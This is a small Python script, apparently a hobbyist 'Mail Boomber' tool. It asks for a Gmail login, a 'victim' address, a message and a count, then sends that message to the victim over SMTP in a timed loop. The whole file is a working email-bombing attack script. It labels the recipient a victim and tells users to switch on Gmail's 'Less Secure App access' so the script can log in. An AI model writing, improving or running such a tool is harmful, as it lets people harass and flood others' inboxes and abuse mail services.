import smtplib
import time

print('''
  __  __       _ _   ____                        _               
 |  \/  |     (_) | |  _ \                      | |              
 | \  / | __ _ _| | | |_) | ___   ___  _ __ ___ | |__   ___ _ __ 
 | |\/| |/ _` | | | |  _ < / _ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|
 | |  | | (_| | | | | |_) | (_) | (_) | | | | | | |_) |  __/ |   
 |_|  |_|\__,_|_|_| |____/ \___/ \___/|_| |_| |_|_.__/ \___|_|   
                                                                 
Created by PythonX ~ ShahadathAkash
''')

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()

gmail = str(input('[*] Must need to use "Less Secure App access" Enabled Gmail\n [*] To turn on "Less Secure App access"\n  [*] "Manage your google account" > "Security" > Find and Enable "Less Secure app Access"\n[~] Sender Gmail address.\nEx: pythonxthebeast@gmail.com\n>>> '))
password = str(input('[~] Password for '+gmail+'\n>>> '))
receiver = str(input('[~] Receiver/Victims Email address.\nEx: victim@gmail.com\n>>> '))
message = str(input('Write the message here.\n>>> '))
amount = int(input('Amount of Messages. (only integer value)\n>>> '))
count = 1
sleep = int(input('Set sleep timer. (sec) min 2\n>>> '))

print('[0] '+str(amount)+' Mail will send to '+str(receiver))
while count <= amount:
    server.login(gmail, password)
    server.sendmail(gmail, receiver, message)
    count += 1
    time.sleep(sleep)
print('[0] Mail Boombing done!!!')
